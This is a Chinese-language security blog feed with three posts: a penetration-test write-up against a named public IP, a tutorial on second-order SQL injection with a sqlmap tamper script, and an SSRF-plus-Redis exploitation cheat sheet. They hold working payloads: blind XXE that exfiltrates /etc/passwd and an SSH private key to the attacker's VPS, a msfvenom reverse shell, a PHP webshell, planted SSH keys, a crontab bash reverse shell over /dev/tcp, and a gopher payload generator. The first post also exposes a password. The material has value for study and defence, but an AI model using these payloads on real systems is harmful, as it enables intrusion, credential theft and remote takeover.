<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Twe1ve&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://github.com/"/>
  <updated>2020-05-19T10:05:54.274Z</updated>
  <id>https://github.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>某面试做题记录</title>
    <link href="https://github.com/2020/05/19/%E6%9F%90%E9%9D%A2%E8%AF%95%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>https://github.com/2020/05/19/%E6%9F%90%E9%9D%A2%E8%AF%95%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2020-05-19T10:03:11.000Z</published>
    <updated>2020-05-19T10:05:54.274Z</updated>
    
    <content type="html"><![CDATA[<p>目标IP：180.101.148.103</p><p>前期信息收集:<br> 端口开放情况：</p><pre><code>80228088</code></pre><p><img src="1.png" alt=""></p><p>8088对应一个web页面，Apache Tomcat/8.0.38</p><p>dirsearsh扫目录发现/admin/目录，一个新建账户功能点，填入信息之后抓包，发现是一个jsp页面，为java环境，且POST数据包的格式为XML，立马想到XXE</p><p>然而借助已有的元素进行触发实体名以完成XXE，然而发现在已有元素中不能出现 &amp; 。否则返回”内部错误”</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;&lt;reg&gt;&lt;name&gt;&amp;xxe&lt;/name&gt;&lt;tel&gt;1&lt;/tel&gt;&lt;email&gt;1&lt;/email&gt;&lt;/reg&gt;</code></pre><p>然后想到 % 触发的形式，也还是会报错,仍然不能成功执行</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY % evil SYSTEM “http://vps_ip/”&gt; %evil; ]&gt;&lt;reg&gt;&lt;name&gt;1&lt;/name&gt;&lt;tel&gt;1&lt;/tel&gt;&lt;email&gt;1&lt;/email&gt;&lt;/reg&gt;</code></pre><p>既然是对现有元素的内容进行判断，那么假如我不适应预定义的元素呢？？？</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE acunetix [&lt;!ENTITY acunetixent SYSTEM &quot;http://vps_ip/&quot;&gt;]&gt;&lt;xxx&gt;&amp;acunetixent;&lt;/xxx&gt;</code></pre><p>监听vps 80端口，成功接收到访问，说明XXE确实存在，但是发现为非回显XXE，尝试OOB，这里踩了很大的一个坑，由于之前只接触过PHP的XXE，对JAVA类型的XXE一无所知，导致在这里卡了好久。因为之前PHP中的XXE都是HTTP协议直接读取文件，OOB一直失败，访问了vps上的dtd，但是却没有任何信息返回。然后想到了是不是语言的问题，搜索一下”JAVA blind XXE”，找到了这篇文章： <a href="https://blog.csdn.net/qq_27446553/article/details/51212957，也就是需要用ftp来传输数据" target="_blank" rel="noopener">https://blog.csdn.net/qq_27446553/article/details/51212957，也就是需要用ftp来传输数据</a></p><p>最终构造paylaod如下：</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;http://vps_ip/evil.dtd&quot;&gt;%remote;]&gt;&lt;root/&gt;</code></pre><p>evil.dtd:(本地借助脚本在33端口起一个ftp服务)</p><pre><code>&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;ftp://vps_ip:33/%file;&apos;&gt;&quot;&gt;%int;%send;</code></pre><p>先读取/etc/passwd  ；比较正常 的 /etc/passwd文件，发现会以CWD为标志，每段后面的 /  被吃掉 ，处理之后：</p><p><img src="2.png" alt=""></p><p>当前只两个个登录用户root、biubiubiu，已知8022端口为SSH服务，则可以尝试读取id_rsa。root下没有.ssh返回,查看root下的.bash_history：<br>.bash_history </p><pre><code>curl api.ipify.org &lt; exit &lt;curl http: &lt; EPSV ALL &lt; EPSV &lt; EPRT |1|172.19.0.2|33967| &lt; RETR 172.2 &lt;ls -la &lt; ifconfig &lt; arp -a &lt;flag{05150500-2-bf28fdcb02874f4e}</code></pre><p>尝试读取home/biubiubiu/.ssh/id_rsa,成功读取之后对返回信息进行处理。即以CWD为标志，每段后面添加一个 / ，去除掉不必要的符号。这里有个小技巧，因为一行的字符数是不确定的（之前做过比较，可能系统差异吧），所以难以分行，这里直接把id_rsa处理成3行（开始和结束一行，所有中间字符一行），然后使用mobaxterm进行连接（mobaxtrem会自动分行）。</p><p>ssh -i ~/id_rsa  <a href="mailto:biubiubiu@180.101.148.103">biubiubiu@180.101.148.103</a> -p 8022</p><p>16eb94bce0b6:~$ cat /proc/1/cgroup</p><pre><code>10:perf_event:/docker/16eb94bce0b62f635dac745b6b6b07c6057404bf074d16e3449cfe1e23788af99:memory:/docker/16eb94bce0b62f635dac745b6b6b07c6057404bf074d16e3449cfe1e23788af98:freezer:/docker/16eb94bce0b62f635dac745b6b6b07c6057404bf074d16e3449cfe1e23788af97:devices:/docker/16eb94bce0b62f635dac745b6b6b07c6057404bf074d16e3449cfe1e23788af96:net_cls,net_prio:/docker/16eb94bce0b62f635dac745b6b6b07c6057404bf074d16e3449cfe1e23788af95:cpu,cpuacct:/docker/16eb94bce0b62f635dac745b6b6b07c6057404bf074d16e3449cfe1e23788af94:blkio:/docker/16eb94bce0b62f635dac745b6b6b07c6057404bf074d16e3449cfe1e23788af93:cpuset:/docker/16eb94bce0b62f635dac745b6b6b07c6057404bf074d16e3449cfe1e23788af92:pids:/docker/16eb94bce0b62f635dac745b6b6b07c6057404bf074d16e3449cfe1e23788af91:name=systemd:/docker/16eb94bce0b62f635dac745b6b6b07c6057404bf074d16e3449cfe1e23788af9</code></pre><p>当前在一个docker中，<br>然后又发现当前在一个busybox中（su: must be suid to work properly）</p><p>16eb94bce0b6:~$ chmod<br>BusyBox v1.24.2 (2016-08-12 14:38:34 GMT) multi-call binary.<br>且发现当前处在一个Docker Alpine container中</p><p><strong>ashell 逃逸：</strong><br>export SHELL=/bin/sh</p><p>16eb94bce0b6:<del>$ sudo<br>-ash: sudo: not found<br>###实际没有完成逃逸<br>16eb94bce0b6:</del>$sh<br>###成功切换为sh<br>尝试路径修复</p><pre><code>export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</code></pre><p>结果还是不能使用sudo、su等命令，也就是Docker Alpine container起环境的时候并没有额外添加这些命令。因为Docker Alpine container默认只有可怜的300多个命令</p><p>简单的信息收集走一波：curl和wget可用，直接下载LinEnum.sh脚本</p><pre><code>curl -O https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh16eb94bce0b6:~$ sh LinEnum.sh</code></pre><p>由于好多命令不可用，所以收集到的内容也有限，arp -a发现很多不完整的连接，也没有跨网段通信</p><p>常规提权：suid 、sudo 、Linux-suggest、计划任务、可写路径等都没有，才疏学浅，也没有发现更多提权思路</p><p>这里提权暂时没有其他思路，不过发现比较幸运的是能够使用SSH命令，首先想到的是ssh+proxychains（但是没有密码，也不能新建用户，有点尴尬）、iptables也没有</p><p>###由于这里的ash只能逃逸到sh，而不能逃逸到bash 。 但是用到的端口转发脚本都是bash格式的，所以又得找sh格式的，所以想想还是传一个msf马然后用msf转发操作吧</p><pre><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=66.98.119.8 LPORT=4444 -f elf &gt; tw</code></pre><p>返回的shell很快就被kill掉，进程迁移也失效，</p><p><img src="3.png" alt=""></p><pre><code>set AutoRunScript migrate -f   ###提前设置自动进程迁移run autoroute -s 172.19.0.0/24  ###添加路由run autoroute -p   ###查看路由添加情况</code></pre><p>发现比之前稍稍稳定一点，刚添加完路由，，又掉了。。。。。。但是进程中确实没有杀毒软件啊,尝试更换为x86的paylaod，还是一样不稳定，但是重连几次之后发现稳定下来了.但是那种大范围扫描会导致断开，所以选择exploit -j，即使断开也能立马回连一个session。而且最重要的是添加的路由还在，不用反复添加。<br>nmap之后简单处理一下，获取存活主机列表：</p><pre><code>cat ip | awk -F &quot;(&quot; &apos;{print $2}&apos; | awk -F &quot;)&quot; &apos;{print $1}&apos; | awk -F &quot;latency&quot; &apos;{print $1}&apos; | grep 172</code></pre><p>结果还没稳定几分钟，又掉了。。。。。。。又开始不稳定，渗透真是一门玄学。。。。</p><p>又是一顿折腾，还是不得行，实在没啥法子了，先放下，然后想一下各种各种，慢慢排除之后，想到是不是因为vps用国外的原因，然后实在不情愿地用起了白嫖来的阿里云ECS（白嫖来只做了一个子域名监控，其他什么环境都没安装，而且阿里云对某些端口的使用也是个迷，就比如4444端口，即使你在安全组里开了它，msf用这个端口监听并不会正常连接。。。）</p><p>ms17_010 发现基本没有开启445端口的机子，0708 也没得。</p><p>yCCN92mswZah6y7uyfvVdES      把这个密码添加到字典中进行ssh、ftp、rdp等爆破</p><p>只能扫描一下内网的常见端口了</p><pre><code>nmap  -p 21,22,23,25,80,445,1433,3306,3389，6379 -Pn 172.19.0.1/24 -T4</code></pre><p>但是全部扫描结果均为下例：</p><p><img src="4.png" alt=""></p><p>然后多方验证，发现nmap扫描结果并不准确，存活主机扫描结果也是一样不准确，，，</p><p>还是用自带的服务扫描模块试试看吧，<br>use auxiliary/scanner/discovery/arp_sweep   ##探测存活主机</p><p>172.18.9.37<br>use auxiliary/scanner/portscan/tcp   ###探测TCP端口服务</p><pre><code>[+] 172.19.0.2:   - 172.19.0.2:22 - TCP OPEN[+] 172.19.0.1:   - 172.19.0.1:22 - TCP OPEN[+] 172.19.0.3:   - 172.19.0.3:3306 - TCP OPEN[+] 172.19.0.2:   - 172.19.0.2:8009 - TCP OPEN[+] 172.19.0.1:   - 172.19.0.1:8022 - TCP OPEN[+] 172.19.0.2:   - 172.19.0.2:8080 - TCP OPEN[+] 172.19.0.1:   - 172.19.0.1:8088 - TCP OPEN[+] 172.19.0.3:   - 172.19.0.3:8989 - TCP OPEN</code></pre><p>最后还是回到通过msf添加一个sockets代理，配合proxychains进行操作(同样需要添加路由)<br>use auxiliary/server/socks5</p><p>然后就是172.19.0.1同时也开放了8022端口，nc探测也为openssh服务，尝试使用相同私钥进行登录，没想到成功了，但是貌似还是回到那个docker中。。。。。</p><p>172.18.9.37：</p><pre><code>21/tcp   open  ftp 22/tcp   open  ssh5432/tcp open  postgresql9999/tcp open  abyss9999/tcp open  msdtc   Microsoft Distributed Transaction Coordinator</code></pre><p>ssh、postgresql弱口令也还是没有</p><p><strong>总结：</strong></p><p>知识面还是不够广吧，一个Java blind xxe搞了半天才搞定，然后就是读取到的id_rsa处理起来也真的麻烦，一个不注意就导致格式错误。拿到主机普通用户权限，没有办法进行进一步提权，只能通过端口转发进行内网渗透。但是相对来说内网实战经验还是少，不说别的，用msf时阿里云ECS端口问题都要弄老半天，进入内网，只能尝试简单的横向，内网存活机子不多，445端口没有也没有开启，之前拿到的那个密码貌似也没有起到作用，其实一直在期待这个密码能够有一个不错的效果。开放的服务就更少了。ssh、mysql爆破均无果</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;目标IP：180.101.148.103&lt;/p&gt;
&lt;p&gt;前期信息收集:&lt;br&gt; 端口开放情况：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;8022
8088&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&quot;1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;8088对应一个web页面，Apa
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>二次注入详解</title>
    <link href="https://github.com/2020/05/19/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/"/>
    <id>https://github.com/2020/05/19/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/</id>
    <published>2020-05-19T09:33:14.000Z</published>
    <updated>2020-05-19T09:37:56.318Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01、二次注入原理："><a href="#0x01、二次注入原理：" class="headerlink" title="0x01、二次注入原理："></a>0x01、二次注入原理：</h1><p>用户提交的值未被处理（转义或过滤）就存储在数据库中，而开发人员信任来自数据库的数据，未经处理直接在其他功能中调用</p><h1 id="0x02、二次注入类型："><a href="#0x02、二次注入类型：" class="headerlink" title="0x02、二次注入类型："></a>0x02、二次注入类型：</h1><ul><li>用户提交的值未被处理（转义或过滤）就存储在数据库中，未经处理直接在其他功能中调用。（对应案例1和3）</li><li>用户输入经过addslashes处理，但是数据库在存储过程吃掉 ‘&#39; ;再次调用时触发paylaod且绕过了addslashes等转义处理 。（对应案例2）</li></ul><p>分析几个案例更容易理解；各个案例的源码我会在文末放出</p><h1 id="0x03、案例1：直接以目标用户身份身份登录"><a href="#0x03、案例1：直接以目标用户身份身份登录" class="headerlink" title="0x03、案例1：直接以目标用户身份身份登录"></a>0x03、案例1：直接以目标用户身份身份登录</h1><p>注册时没有经过任何任何处理，payload直接存入数据库；在登录时触发payload以目标（通常为管理员）身份登录</p><p>注册时构造payload：</p><pre><code>用户名：admin&apos; -- -密码：password</code></pre><p>登录处验证代码：</p><pre><code>if($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;){// Check if username is emptyif(empty(trim($_POST[&quot;username&quot;]))){    $username_err = &apos;Please enter username.&apos;;} else{    $username = trim($_POST[&quot;username&quot;]);}// Check if password is emptyif(empty(trim($_POST[&apos;password&apos;]))){    $password_err = &apos;Please enter your password.&apos;;} else{    $password = trim($_POST[&apos;password&apos;]);}####对用户输入没有进行特殊处理if(empty(trim($_POST[&quot;username&quot;]))){$username_err = &apos;Please enter username.&apos;;} else{    $username = trim($_POST[&quot;username&quot;]);  }// Check if password is emptyif(empty(trim($_POST[&apos;password&apos;]))){    $password_err = &apos;Please enter your password.&apos;;} else{    $password = trim($_POST[&apos;password&apos;]);}// Validate credentialsif(empty($username_err) &amp;&amp; empty($password_err)){    // Prepare a select statement    $sql = &quot;SELECT username, password FROM users WHERE username = ?&quot;;####此时将用户名和密码从数据库中取出----&gt;触发构造的payload  ##SQL语句为：SELECT username, password FROM users WHERE username = &apos;admin&apos; -- - ##也就是取出admin账户的账户密码来做验证；所以后边的代码可以不用看都没事       if($stmt = mysqli_prepare($link, $sql)){        // Bind variables to the prepared statement as parameters        mysqli_stmt_bind_param($stmt, &quot;s&quot;, $param_username);。###在传递给mysqli_prepare()的SQL语句中为参数标记绑定变量为用户输入        // Set parameters        $param_username = $username;        // Attempt to execute the prepared statement        if(mysqli_stmt_execute($stmt)){            // Store result            mysqli_stmt_store_result($stmt);     ###获取$sql执行结果                          // Check if username exists, if yes then verify password            if(mysqli_stmt_num_rows($stmt) == 1){     ####结果集中行数等于1,即用户存在                               // Bind result variables                mysqli_stmt_bind_result($stmt, $username, $hashed_password); ###将结果集中的列绑定到变量。                if(mysqli_stmt_fetch($stmt)){  ###从准备好的语句中获取结果到mysqli_stmt_bind_result()绑定的变量中 。                    if(password_verify($password, $hashed_password)){                        /* Password is correct, so start a new session and                        save the username to the session */                        session_start();                        $_SESSION[&apos;username&apos;] = $username;                              header(&quot;location: home.php&quot;);                    } else{                        // Display an error message if password is not valid                        $password_err = &apos;The password you entered was not valid.&apos;;                    }                }            } else{                // Display an error message if username doesn&apos;t exist                $username_err = &apos;No account found with that username.&apos;;            }        } else{            echo &quot;Oops! Something went wrong. Please try again later.&quot;;        }    }</code></pre><h1 id="0x04、案例2：经典案例sqli-labs-24，更改管理账户密码"><a href="#0x04、案例2：经典案例sqli-labs-24，更改管理账户密码" class="headerlink" title="0x04、案例2：经典案例sqli-labs-24，更改管理账户密码"></a>0x04、案例2：经典案例sqli-labs-24，更改管理账户密码</h1><p>在注册时构造payload</p><pre><code>用户名： admin&apos; #密码：password</code></pre><p>注册时对用户输入的注册用户名进行特殊字符转义</p><pre><code>$username=  mysql_escape_string($_POST[&apos;username&apos;]) ;$pass= mysql_escape_string($_POST[&apos;password&apos;]);$re_pass= mysql_escape_string($_POST[&apos;re_password&apos;]);....###此时payload被转义为admin\&apos;\ #...$sql = &quot;insert into users ( username, password) values(\&quot;$username\&quot;, \&quot;$pass\&quot;)&quot;;mysql_query($sql) or die(&apos;Error Creating your user account,  : &apos;.mysql_error());...##存入数据库后payload被还原为: admin&apos; #</code></pre><p>也就是转义会被数据库吃掉，在被引用时还原为我们的paylaod；原理如下图</p><p><img src="1.png" alt=""></p><p>登录时同样对用户输入进行特殊字符转义（没有进行特殊处理的话即会变成案例1）</p><pre><code>function sqllogin(){   $username = mysql_real_escape_string($_POST[&quot;login_user&quot;]);   $password = mysql_real_escape_string($_POST[&quot;login_password&quot;]);   $sql = &quot;SELECT * FROM users WHERE username=&apos;$username&apos; and password=&apos;$password&apos;&quot;;//$sql = &quot;SELECT COUNT(*) FROM users WHERE username=&apos;$username&apos; and password=&apos;$password&apos;&quot;;   $res = mysql_query($sql) or die(&apos;You tried to be real smart, Try harder!!!! :( &apos;);   $row = mysql_fetch_row($res);//print_r($row) ;   if ($row[1]) {return $row[1];   } else {  return 0;   }}</code></pre><p>简单验证一下注册和登录流程：</p><p><img src="1.png" alt=""></p><p>更改密码：</p><pre><code>$sql = &quot;UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;$username&apos; and password=&apos;$curr_pass&apos; &quot;;####直接获取当前用户名进行密码更新###此时SQL语句： UPDATE users SET PASSWORD=&apos;password&apos; where username=&apos;admin&apos;#&apos; and password=&apos;$curr_pass&apos;$res = mysql_query($sql) or die(&apos;You tried to be smart, Try harder!!!! :( &apos;);........</code></pre><p>至此完成二次注入对目标用户密码的修改</p><h1 id="0x05、案例3：二次注入中的数据查询（利用SQLMAP脚本进行二次注入）"><a href="#0x05、案例3：二次注入中的数据查询（利用SQLMAP脚本进行二次注入）" class="headerlink" title="0x05、案例3：二次注入中的数据查询（利用SQLMAP脚本进行二次注入）"></a>0x05、案例3：二次注入中的数据查询（利用SQLMAP脚本进行二次注入）</h1><p> 以HTB的NightMare靶机为例：</p><p>注册帐户名 ： ’</p><p>登录进入发现SQL报错</p><p><img src="3.png" alt=""></p><p>初步验证注入点 ，在BurpSuit分别抓注册和登录包发送到Repeater；来回切换</p><pre><code>&apos; -- -  仍然报错；寻找正确闭合方式&quot; -- - 回显SQL报错信息&apos;) -- -无SQL报错信息1&apos;) or 1=1 #无SQL报错信息&apos;) order by 1000#   回显SQL报错信息&apos;) order by 1#  无SQL报错信息.....###最终验证出列值为 2 </code></pre><p><strong>使用SQLMAP进行POST二次注入；</strong><br>编写对应tamper脚本简易思路：（难点是注册之后基于新cookie进行身份验证）<br>我在这里找到了对应的技巧：将HTTP请求发送到主页并检索新的cookie值；将sqlmap生成HTTP请求替换Cookie值 </p><p><a href="https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/" target="_blank" rel="noopener">https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/</a></p><p><a href="https://medium.com/@lethanhphuc.pk/second-order-sql-injection-explained-with-example-f67fb199f5e5" target="_blank" rel="noopener">https://medium.com/@lethanhphuc.pk/second-order-sql-injection-explained-with-example-f67fb199f5e5</a></p><p>注册：register username位置填入 payload ;密码固定password=123456    </p><p>post_data = { ‘username’:payload, ‘password’:’tw123’,’register’:’Register’ }</p><p>然后是获取用户注册成功后返回的cookie并执行替换；使用–second-url  <a href="http://10.10.10.66/notes.php" target="_blank" rel="noopener">http://10.10.10.66/notes.php</a><br>在index之后请求notes.php验证结果</p><p>response = s.post(“<a href="http://10.10.10.66/register.php&quot;" target="_blank" rel="noopener">http://10.10.10.66/register.php&quot;</a>, data=post_data)</p><p>php_cookie = re.search(‘PHPSESSID=(.*?);’, response.headers[‘Set-Cookie’]).group(1)</p><p>最终tamper：</p><pre><code>#!/usr/bin/env pythonimport reimport requestsfrom lib.core.enums import PRIORITY__priority__ = PRIORITY.NORMALdef dependencies():passdef create_account(payload):s = requests.Session()post_data = { &apos;user&apos;:payload, &apos;pass&apos;:&apos;tw123&apos;, &apos;register&apos;:&apos;Register&apos; }proxies = { &apos;http&apos;:&apos;http://127.0.0.1:8080&apos; }response = s.post(&quot;http://10.10.10.66/register.php&quot;, data=post_data, proxies=proxies)php_cookie = re.search(&apos;PHPSESSID=(.*?);&apos;, response.headers[&apos;Set-Cookie&apos;]).group(1)return &quot;PHPSESSID={0}&quot;.format(php_cookie)def tamper(payload, **kwargs):headers = kwargs.get(&quot;headers&quot;, {})headers[&quot;Cookie&quot;] = create_account(payload)return payload</code></pre><p>sqlmap语句：</p><pre><code>sqlmap --technique=U -r login.req --dbms mysql --tamper second-order.py --second-url &apos;http://10.10.10.66/notes.php&apos; -p user --proxy http://127.0.0.1:8080</code></pre><p><img src="4.png" alt=""></p><p><img src="5.png" alt=""></p><p>注意点：</p><ul><li>post包中密码需要和tamper脚本中一致</li><li>去掉login.req中的cookie那一行</li><li>使用代理的话需要开启Burpsuit</li></ul><p>这里就直接贴最终的paylaod吧：</p><pre><code>sqlmap --technique=U -r login.req --dbms mysql --tamper second-order.py --second-url &apos;http://10.10.10.66/notes.php&apos; -p user --proxy http://127.0.0.1:8080 --dump -D sysadmin --no-cast</code></pre><p>####需要–no-cast 参数</p><h1 id="0x06、总结："><a href="#0x06、总结：" class="headerlink" title="0x06、总结："></a>0x06、总结：</h1><p>主要利用点还是网站对用户输入没有进行处理（这也是二次注入比较少的原因之一）；但是二次注入工具难以检测，所以危害还是很大的</p><p>参考链接：</p><p><a href="http://www.beesfun.com/2017/03/28/MySQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-%E4%B8%89/" target="_blank" rel="noopener">http://www.beesfun.com/2017/03/28/MySQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-%E4%B8%89/</a></p><p><a href="http://www.thegreycorner.com/2017/01/exploiting-difficult-sql-injection.html" target="_blank" rel="noopener">http://www.thegreycorner.com/2017/01/exploiting-difficult-sql-injection.html</a></p><p><a href="https://medium.com/@lethanhphuc.pk/second-order-sql-injection-explained-with-example-f67fb199f5e5" target="_blank" rel="noopener">https://medium.com/@lethanhphuc.pk/second-order-sql-injection-explained-with-example-f67fb199f5e5</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x01、二次注入原理：&quot;&gt;&lt;a href=&quot;#0x01、二次注入原理：&quot; class=&quot;headerlink&quot; title=&quot;0x01、二次注入原理：&quot;&gt;&lt;/a&gt;0x01、二次注入原理：&lt;/h1&gt;&lt;p&gt;用户提交的值未被处理（转义或过滤）就存储在数据库中，而开发人
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>SSRF+Redis</title>
    <link href="https://github.com/2020/05/19/SSRF-Redis/"/>
    <id>https://github.com/2020/05/19/SSRF-Redis/</id>
    <published>2020-05-19T09:02:15.000Z</published>
    <updated>2020-05-19T09:12:21.671Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://docs.ioin.in/writeup/fuzz.wuyun.org/_src_build_your_ssrf_exp_autowork_pdf/index.pdf" target="_blank" rel="noopener">猪猪侠SSRF议题</a></p><p>形成SSRF的代码示例：</p><pre><code>&lt;?phpfunction curl($url){  $ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_exec($ch);curl_close($ch);}$url = $_GET[&apos;url&apos;];curl($url);?&gt;</code></pre><h2 id="SSRF绕过限制："><a href="#SSRF绕过限制：" class="headerlink" title="SSRF绕过限制："></a>SSRF绕过限制：</h2><ol><li><p>利用短网址</p></li><li><p>xip.io  –&gt; 127.0.0.1.xip.io</p></li><li><p>@符号绕过 –&gt; <a href="http://www.baidu.com@127.0.0.1" target="_blank" rel="noopener">www.baidu.com@127.0.0.1</a> —&gt;访问127.0.0.1（利用解析问题绕过）</p></li><li><p>dns rebinding ： <a href="http://www.bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">http://www.bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/</a></p></li><li><p>更改ip地址写法，如十六进制 <a href="http://127.0.0.1" target="_blank" rel="noopener">http://127.0.0.1</a> —&gt;<a href="http://0177.0.0.1" target="_blank" rel="noopener">http://0177.0.0.1</a></p></li><li><p>协议层请求绕过  —&gt; 请求带有事先设计跳转的页面file ftp（302跳转）</p> <?php header("Location:file:///etc/passwd") ?></li></ol><h2 id="Redis未授权"><a href="#Redis未授权" class="headerlink" title="Redis未授权"></a>Redis未授权</h2><h2 id="绝对路径写webshell："><a href="#绝对路径写webshell：" class="headerlink" title="绝对路径写webshell："></a><strong>绝对路径写webshell：</strong></h2><ul><li>flushall</li><li>set 1 ‘<?php system($_GET["cmd"]);?>‘ </li><li>config set dir /var/www/html</li><li>config set dbfilename shell.php</li><li>save</li></ul><p>写ssh公钥：</p><pre><code>ssh-keygen -t rsa ###生成公钥</code></pre><ul><li>flushall</li><li>set 1 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDw2hZflPUjUwuzH6yIgXRiZtBa4L9I6nFqaTH7OELXd4ErUUm4ucBcQBXJqD9wilAepPDKqVohWITXQdLUzyi7ICHrhgVELjk3JRdJ6aJFYJEtXpTi1wJYCaV1Jb9WidF7Jfb2B7rp/TWI0HOORNQJCmA04iFXRAaER1cQTq0ZW+/iB03uTrr5rbmgg/MlwJFa4vSgGSskI2xJ2NOpz4LLBQaybs8VBgr7IqaBcNl55qiZoWcILCVxSW0IyNiPVrLc1nI/oi2sOrFoaGSFFZp35ne9TKzeYyZl5LY3enX1eepNGW1MMYf5NdCcDHjvjcYVa20jqpvD6jDFhOjCfk/nMt1FTRB79LiZ/KKNkdUUZzauTqyyYjZsWKZ1+CcKjk7nVsfFINI8Ap/sGd4J/LXw5QaepKTx+DTmom7c67bYhnFheOQVWusmtghYiC/1UYIyLOayrgLiwt5xIsb5KjgMN29PJpf7zxpUV/TgbgkYLFzNt2CP5u5aWyXdRDyA/K0=</li><li>config set dir /root/.ssh/</li><li>config set dbfilename authorized_keys</li><li>save</li></ul><p><strong>写contrab定时任务反弹shell：</strong></p><ul><li>flushall</li><li>set 1 ‘\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/4444 0&gt;&amp;1\n\n’</li><li>config set dir /var/spool/cron/</li><li>config set dbfilename root</li><li>save</li></ul><h2 id="SSRF-Redis利用"><a href="#SSRF-Redis利用" class="headerlink" title="SSRF+Redis利用"></a>SSRF+Redis利用</h2><ul><li>http、https 内网服务探测</li><li>file-读取文本</li><li>file:///etc/passwd</li><li>….</li><li>dict 用于泄露软件安装版本信息探测端口、操作redis（但由于空格问题，无法正常写入文件）</li></ul><p>dict://127.0.0.1:6379/info<br>dict://127.0.0.1:6379/getuser<br>dict://127.0.0.1:6379/flushall</p><p><strong>gopher 万能协议反弹shell：(redis利用需要REST编码)</strong></p><p>Gopher协议中需要对paylaod进行编码；空格用%0a,回车换行使用%0d%0a，参数之间的分隔符也用URL编码<br>转换Redis RESP格式脚本<a href="https://xz.aliyun.com/t/5665#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/5665#toc-4</a><br>根据需求更改payload、filename、path的值</p><pre><code>import urllibprotocol=&quot;gopher://&quot;ip=&quot;127.0.0.1&quot;port=&quot;6379&quot;payload=&quot;\n\n&lt;?php system($_GET[\&quot;cmd\&quot;]);?&gt;\n\n&quot;filename=&quot;shell.php&quot;path=&quot;/var/www/html&quot;passwd=&quot;&quot;cmd=[&quot;flushall&quot;, &quot;set 1 {}&quot;.format(payload.replace(&quot; &quot;,&quot;${IFS}&quot;)), &quot;config set dir {}&quot;.format(path), &quot;config set dbfilename {}&quot;.format(filename), &quot;save&quot; ]if passwd:cmd.insert(0,&quot;AUTH {}&quot;.format(passwd))payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;def redis_format(arr):CRLF=&quot;\r\n&quot;redis_arr = arr.split(&quot; &quot;)cmd=&quot;&quot;cmd+=&quot;*&quot;+str(len(redis_arr))for x in redis_arr:cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;${IFS}&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;${IFS}&quot;,&quot; &quot;)cmd+=CRLFreturn cmdif __name__==&quot;__main__&quot;:for x in cmd:payload += urllib.quote(redis_format(x))print payload</code></pre><p><strong>ubuntu无法写crontab反弹shell： <a href="https://xz.aliyun.com/t/1800" target="_blank" rel="noopener">https://xz.aliyun.com/t/1800</a></strong></p><p><img src="1.png" alt=""></p><h2 id="SSRF利用redis之不换行"><a href="#SSRF利用redis之不换行" class="headerlink" title="SSRF利用redis之不换行"></a><a href="https://dzmitry-savitski.github.io/2018/07/redis-ssrf-exploits-without-new-line" target="_blank" rel="noopener">SSRF利用redis之不换行</a></h2><ul><li>FLUSHALL</li><li>config set dir /var/www/html/</li><li>set a1 ZY%16%0E%16F</li><li>set a2 ffffff</li><li>BITOP XOR payload a1 a2</li><li>append payload eval($_GET[c]);%3f&gt;</li><li>config set dbfilename 